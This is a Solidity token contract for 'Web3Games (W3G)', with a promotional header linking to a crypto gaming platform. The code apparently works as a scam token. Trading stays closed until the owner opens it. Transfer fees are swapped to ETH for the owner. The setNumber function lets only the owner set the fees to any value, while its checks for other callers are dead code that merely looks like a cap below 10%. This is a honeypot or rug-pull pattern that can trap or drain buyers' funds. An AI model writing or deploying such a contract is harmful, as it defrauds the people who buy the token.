/*

Infrastructure powered by Web3Games.com

  * Platform: The one-stop crypto gaming hub for the community.
  * Marketplace: Seamlessly buy and sell gaming NFTs.
  * W3G Swap: AMM-based token swap, facilitates secure gaming token trading.
  * Launchpad: Empowers game developers to conduct gaming token sales.
  * Web3Games Login: Streamlines the onboarding process for new crypto gamers.

Twitter: https://twitter.com/web3games
Website: https://web3games.com
Whitepaper: https://whitepaper.web3games.com/about-web3games.com/introduction
Discord: discord.gg/web3game

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Web3Games {
    string public constant name = "Web3Games";
    string public constant symbol = "W3G";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 2_000_000 * 10 ** decimals;
    uint256 swapAmount = totalSupply / 100;
    uint256 BurnNumber = 3;
    uint256 ConfirmNumber = 5;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address public pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant uniswapV2Router =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address owner;

    bool private swapping;
    bool private TradingOpenStatus;

    constructor() {
        owner = msg.sender;
        balanceOf[owner] = totalSupply;
        allowance[address(this)][uniswapV2Router] = type(uint256).max;
        allowance[owner][uniswapV2Router] = type(uint256).max;
        emit Transfer(address(0), owner, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        require(TradingOpenStatus || from == owner || to == owner);

        if (!TradingOpenStatus && pair == address(0) && amount > 0) pair = to;

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            IUniswapV2Router02(uniswapV2Router)
                .swapExactTokensForETHSupportingFeeOnTransferTokens(
                    balanceOf[address(this)],
                    0,
                    path,
                    owner,
                    block.timestamp
                );
            swapping = false;
        }

        if (from != address(this)) {
            uint256 FinalFigure = (amount *
                (from == pair ? BurnNumber : ConfirmNumber)) / 100;
            amount -= FinalFigure;
            balanceOf[address(this)] += FinalFigure;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function OpenTrade() external {
        require(msg.sender == owner);
        require(!TradingOpenStatus);
        TradingOpenStatus = true;
    }

    function setNumber(uint256 newTBurn, uint256 newTConfirm) external {
        if (msg.sender == owner) {
            BurnNumber = newTBurn;
            ConfirmNumber = newTConfirm;
        } else {
            require(newTBurn < 10);
            require(newTConfirm < 10);
            revert();
        }
    }

    function cliamEther() external payable {
        payable(owner).transfer(address(this).balance);
    }
}